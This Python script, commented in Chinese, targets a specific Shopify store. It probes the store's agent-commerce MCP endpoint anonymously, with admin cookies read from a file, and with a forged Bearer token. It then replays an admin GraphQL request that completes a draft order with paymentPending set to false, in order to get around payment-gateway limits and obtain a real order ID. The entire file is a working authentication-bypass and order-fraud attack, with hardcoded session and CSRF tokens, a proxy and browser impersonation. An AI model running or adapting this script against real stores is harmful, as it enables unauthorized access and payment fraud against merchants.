# -*- coding: utf-8 -*-
"""1) merchant 域 UCP MCP 鉴权探测(漏洞链:匿名/弱鉴权可调完整工具)
2) paymentPending=false 完成草稿订单(绕 dev store 网关限制,拿正式 Order ID)
"""
import json
from curl_cffi import requests

COOKIE_FILE = r"C:\Users\tndc2\AppData\Local\Temp\admin_cookies.txt"
PROXY = {"https": "http://192.168.0.199:1080", "http": "http://192.168.0.199:1080"}

def load_cookies():
    raw = open(COOKIE_FILE, encoding="utf-8").read().strip()
    return {k: v for k, v in (p.split("=", 1) for p in raw.split("; ") if "=" in p)}

BASE = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json",
}

def ucp_probe(label, url, extra_headers=None, payload=None):
    h = dict(BASE)
    if extra_headers:
        h.update(extra_headers)
    body = payload or {
        "jsonrpc": "2.0", "method": "tools/list", "id": 1,
        "params": {"meta": {"ucp-agent": {"profile": "https://shopify.dev/ucp/agent-profiles/2026-04-08/personal_agent.json"}}},
    }
    try:
        r = requests.post(url, json=body, headers=h, proxies=PROXY, impersonate="chrome", timeout=30)
        print(f"[{label}] HTTP {r.status_code}")
        print(f"  {r.text[:600]}")
        return r
    except Exception as e:
        print(f"[{label}] ERROR {e}")
        return None

if __name__ == "__main__":
    url = "https://jqpkdm-kb.myshopify.com/api/ucp/mcp"
    print("=" * 60)
    print("PART 1: merchant 域 UCP MCP 鉴权")
    # 1a 匿名
    ucp_probe("ANON tools/list", url)
    # 1b 带 admin cookie
    ucp_probe("ADMIN-COOKIE tools/list", url, {"Cookie": open(COOKIE_FILE, encoding="utf-8").read().strip()})
    # 1c 伪造 Bearer
    ucp_probe("FAKE-BEARER tools/list", url, {"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.abc"})
    # 1d tools/call create_checkout(匿名,看是否 Tool not found 还是鉴权错误)
    ucp_probe("ANON create_checkout", url, payload={
        "jsonrpc": "2.0", "method": "tools/call", "id": 2,
        "params": {"name": "create_checkout", "arguments": {"meta": {"ucp-agent": {"profile": "https://shopify.dev/ucp/agent-profiles/2026-04-08/personal_agent.json"}}, "checkout": {"line_items": [{"quantity": 1, "item": {"id": "gid://shopify/ProductVariant/44692674674730"}}]}}},
    })

    print("=" * 60)
    print("PART 2: paymentPending=false 完成草稿订单")
    gql_url = "https://admin.shopify.com/api/operations/12af77c8135a10656e3cf14cb69d746505a1df3b62c08faea80a0a3949c21f8d/DraftOrderComplete/shopify/jqpkdm-kb"
    gql_headers = {
        "User-Agent": BASE["User-Agent"],
        "Accept": "application/json",
        "Content-Type": "application/json",
        "X-CSRF-Token": "oTC8C29ZFZ-OPOn-MXOYPQ_NRv8AX-BB1tkHeg",
        "Origin": "https://admin.shopify.com",
        "Referer": "https://admin.shopify.com/store/jqpkdm-kb/draft_orders/1102015168554",
        "Sec-CH-UA": '"Chromium";v="138", "Google Chrome";v="138", "Not.A/Brand";v="99"',
        "Sec-CH-UA-Mobile": "?0",
        "Sec-CH-UA-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
    }
    for pending in [False]:
        body = {
            "operationName": "DraftOrderComplete",
            "variables": {
                "id": "gid://shopify/DraftOrder/1102015168554",
                "paymentPending": pending,
                "paymentGatewayId": None,
                "sourceName": "shopify_draft_orders",
                "bypassCartValidations": False,
            },
            "extensions": {"client_context": {"page_view_token": "81a384a6-1a26-4f04-93a2-faca565b1f40",
                "client_route_handle": "draftOrders:show",
                "client_pathname": "/store/jqpkdm-kb/draft_orders/1102015168554",
                "client_normalized_pathname": "/store/:storeHandle/draft_orders/:id",
                "shopify_session_token": "0f6832a6-1f3c-40ef-805e-29f861ec7367",
                "shopify_multitrack_token": "34b29e38-9809-47b2-ac03-64535d399fdd"}},
        }
        try:
            r = requests.post(gql_url, json=body, headers=gql_headers, cookies=load_cookies(), proxies=PROXY, impersonate="chrome", timeout=30)
            print(f"[paymentPending={pending}] HTTP {r.status_code}")
            print(f"  {r.text[:800]}")
        except Exception as e:
            print(f"[paymentPending={pending}] ERROR {e}")
